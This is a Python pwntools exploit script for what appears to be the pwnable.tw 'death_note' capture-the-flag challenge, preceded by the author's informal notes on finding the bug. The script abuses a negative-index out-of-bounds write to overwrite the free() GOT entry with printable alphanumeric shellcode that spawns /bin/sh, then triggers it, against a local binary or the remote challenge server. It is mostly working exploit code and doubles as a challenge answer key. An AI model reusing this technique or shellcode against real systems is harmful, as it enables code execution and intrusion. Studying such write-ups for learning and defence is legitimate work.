#!/usr/bin/env python3
from pwn import *
from sys import argv
"""
add will read in 0x50 bytes of data
only printable characters within ascii, which means that we cannot write addresses or shellcode?
there is printable shellcode, maybe that is the challenge?
hmhm, we need to find a gadget where our shellcode is executed?
NX is disabled, so this is plausible?
it seems as though the global note object can store 20 pointers, but checks for OOB at 10?
uhhh, also a strange thing that is happening, it will call free() within the delete function to
a stack pointer? I have checked the freelist and yes, it does successfully cache that pointer. This
is very strange..
no malloc but data is on the heap???
is radare lying to me????
oh im just stupid, i just remembered that strdup will use malloc internally to copy.
i am braindead :(
we can use negative number for index, just a note..
it will use our input as index, and i confirmed that atoi() will successfully convert negative integers
is this a write what where? 
*(note_t *)(obj.note + index_input * 4) = name_pointer;
the index_input is our index input, returned by read_int(), our name_pointer is our name that has been
strdup'd onto the heap.
if we are to supply a negative number, it will allow us to write to lower addresses in memory correct?
and since there is no restriction??
where is our note object? can we write to the GOT? is got.plt in lower address relative to obj.note?
PWN IS SO FUN
i will test this out :DDDD
obj.note = 0x0804a060
.got.plt = 0x0804a000
it seems as though my hunch was correct :D
so at the index of -1, it is the same as 0, since 0 * 4 = 0
lets calculate the offset between obj.note and GOT table
60/4 = 15 + 1 = 16
-16 will allow us to write to the GOT, lets find an entry which we can freely control
input to, and wont break the program.
we could overwrite atoi? i dont know if the \n character will mess with our input though, it should
be fine?
wait, this means we also have an OOB read right? since the show_note() function uses the same
method of indexing and accessing. If we are able to read the note structure, we could leak our
heap pointers possibly? wait no i dont think the heap is executable. nevermind, brainfart, ignore me.
we could also overwrite strlen? ill keep a little list of possible got entries that we can overwrite
- atoi      - we can pass input to read, then to atoi
- strlen    - we can pass input to read, then to strlen
- exit      - simple, if we get a one shot overwrite then this will be easy and clean, no side effects
- free      - if we overwrite, we can pass a pointer by index, one that will be dereferenced as apposed to atoi/strlen
since we can read from the got, we could leak libc couldnt we?
hmhm i will test this out, if this is possible then a simple got overwrite of system will be good
the leaks dont seem to be working, they might be due to printf stopping at null byte?
i have checked the correct offsets, but for some reason they just output \x68\x30
ok got it, just overwrite free GOT entry with alphanumeric shellcode, and call delete.
"""
context(arch='i386',os='linux')
binary=ELF("./death_note",checksec=False)
if len(argv)>1 and argv[1]=="-r":
    p=remote("chall.pwnable.tw",10201)
else:
    p=binary.process()
s=lambda x,r="":p.sendlineafter(r,x)if r else p.sendline(x)
add=lambda idx,name:(success("added note #%s: %s"%(idx,name)),s("1","choice :"),s(str(idx),":"),s(name,":"))
show=lambda idx:(success("showed note #%s"%idx),s("2","choice :"),s(str(idx),":"))
delete=lambda idx:(success("deleted note #%s"%idx),s("3","choice :"),s(str(idx),":"))
note=binary.symbols['note']
calc=lambda addr:(addr-note)/4
shellcode=b"j0X40P`h//shh/binT[Hf5eOf5W0P_j0X40@@@@@@@@@@@3S0f1z83S0"

add(calc(binary.got['free']),shellcode)
delete(calc(binary.got['free']))

p.interactive()
